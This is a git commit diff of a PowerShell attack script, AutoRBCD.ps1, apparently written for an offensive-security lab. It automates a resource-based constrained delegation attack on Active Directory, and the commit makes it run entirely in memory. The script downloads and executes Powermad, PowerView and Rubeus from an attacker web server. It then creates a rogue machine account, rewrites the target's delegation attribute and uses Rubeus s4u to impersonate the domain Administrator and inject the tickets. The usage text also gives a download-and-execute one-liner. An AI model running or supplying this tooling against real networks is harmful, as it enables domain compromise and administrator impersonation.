27f15293f6272a07e532e2e8395c754cca30094e
m33s33ks <33911194+m33s33ks@users.noreply.github.com>
2021-05-17 09:28:28 +0200

    Update AutoRBCD.ps1
    wrapped the whole thing into a function so we can execute it without touching disk.

--- AutoRBCD.ps1
+++ AutoRBCD.ps1
@@ -1,53 +1,71 @@
-# needs three arguments and then automagically does the resource based constrained delegation attack
-# in the current context.
-# Usage:   PS C:\AutoRBCD.ps1 -WebServer -Target -Domain
-# Example: PS C:\AutoRBCD.ps1 -WebServer 192.168.49.68 -Target appsrv01 -Domain prod.corp3.com
-#--------------------------------------------------------------------------------------------------------
+function Invoke-AutoRBCD{
+    <# 
+    .SYNOPSIS
 
-param($WebServer, $Target, $Domain)
-# get current directory
-$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
-# load the files into memory and import them
-Write-Host "[+] Check if the files are present"
+        Automagically executes the resource based constrained delegation attack in the current context.
+	And requests tickets for the administrative user of the Target.
+	No files are written to disk, everything is executed from memory.
 
-If (-Not(Test-Path -Path "$ScriptDir\Powermad.ps1")){
-iex(New-Object System.Net.WebClient).DownloadString("http://$WebServer/Powermad.ps1")
+     .PARAMETER WebServer
+
+        Specifies the ip adress or hostname where the Scripts Powermad, 
+	Powerview and Rubeus.exe can be downloaded
+
+     .PARAMETER Target
+
+        Specifies the Target on which we have the GenericWrite permission.
+
+     .PARAMETER Domain
+
+        Specifies the domain to use when creating the Rubeus tickets
+
+     .Example
+ 	. ./AutoRBCD.ps1 | Invoke-AutoRBCD -WebServer 192.168.49.68 -Target appsrv01 -Domain prod.corp3.com
+
+     .Example2 
+	(New-Object System.Net.WebClient).DownloadString("http:<serverip>/AutoRBCD.ps1") | iex; Invoke-AutoRBCD -WebServer 192.168.49.68 -Target appsrv01 -Domain prod.corp3.com
+
+#>
+	[CmdletBinding()]
+	param($WebServer, $Target, $Domain)
+	# load the files into memory and import them
+	Write-Host "[+] load modules in memory"
+
+	iex(New-Object System.Net.WebClient).DownloadString("http://$WebServer/Powermad.ps1")
+	iex(New-Object System.Net.WebClient).DownloadString("http://$WebServer/PowerView.ps1")
+
+	$ruby = (New-Object System.Net.WebClient).DownloadData("http://$WebServer/Rubeus.exe")
+	$assem = [System.Reflection.Assembly]::Load($ruby)
+
+
+	# generate a random computer name
+	$MachineName = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
+
+	Write-Host "[+] Add a Machine with the name $MachineName"
+	# add the machine account that we just created (Powermad)
+	New-MachineAccount -MachineAccount $MachineName -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
+
+	Write-Host "[+] SID Stuff"
+	# get the SID of the new computer we've added
+	$ComputerSid = Get-DomainComputer $MachineName -Properties objectsid | Select -Expand objectsid
+
+	# build the new raw security descriptor with this computer account as the principal
+	$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+
+	# get the binary bytes for the SD
+	$SDBytes = New-Object byte[] ($SD.BinaryLength)
+	$SD.GetBinaryForm($SDBytes, 0)
+
+	Write-Host "[+] Set the msds-allowedtoactonbehalfofotheridentity property"
+	# set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
+	Get-DomainComputer $Target | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+	# purge tickets
+	[Rubeus.Program]::Main("purge".Split())
+
+	$fqdn = -join($Target,".",$Domain)
+	# execute Rubeus' s4u process against $TargetComputer
+	#   AA6EAFB522589934A6E5CE92C6438221 == 'h4x'
+	#   impersonating "Administrator" (a DA) to the cifs sname for the target computer (primary)
+	[Rubeus.Program]::Main("s4u /user:$MachineName`$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:cifs/$fqdn /altservice:http,ldap,krbtgt,winrm /ptt".Split())
 }
-If (-Not(Test-Path -Path "$ScriptDir\PowerView.ps1")){
-iex(New-Object System.Net.WebClient).DownloadString("http://$WebServer/PowerView.ps1")
-}
-If (-Not(Test-Path -Path "$ScriptDir\Rubeus.exe")){
-$ruby = (New-Object System.Net.WebClient).DownloadData("http://$WebServer/Rubeus.exe")
-$assem = [System.Reflection.Assembly]::Load($ruby)
-}
-
-# generate a random computer name
-$MachineName = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
-
-Write-Host "[+] Add a Machine with the name $MachineName"
-# add the machine account that we just created (Powermad)
-New-MachineAccount -MachineAccount $MachineName -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
-
-Write-Host "[+] SID Stuff"
-# get the SID of the new computer we've added
-$ComputerSid = Get-DomainComputer $MachineName -Properties objectsid | Select -Expand objectsid
-
-# build the new raw security descriptor with this computer account as the principal
-$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
-
-# get the binary bytes for the SD
-$SDBytes = New-Object byte[] ($SD.BinaryLength)
-$SD.GetBinaryForm($SDBytes, 0)
-
-Write-Host "[+] Set the msds-allowedtoactonbehalfofotheridentity property"
-# set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
-Get-DomainComputer $Target | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
-
-# purge tickets
-[Rubeus.Program]::Main("purge".Split())
-
-$fqdn = -join($Target,".",$Domain)
-# execute Rubeus' s4u process against $TargetComputer
-#   AA6EAFB522589934A6E5CE92C6438221 == 'h4x'
-#   impersonating "Administrator" (a DA) to the cifs sname for the target computer (primary)
-[Rubeus.Program]::Main("s4u /user:$MachineName`$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:cifs/$fqdn /altservice:http,ldap,krbtgt,winrm /ptt".Split())
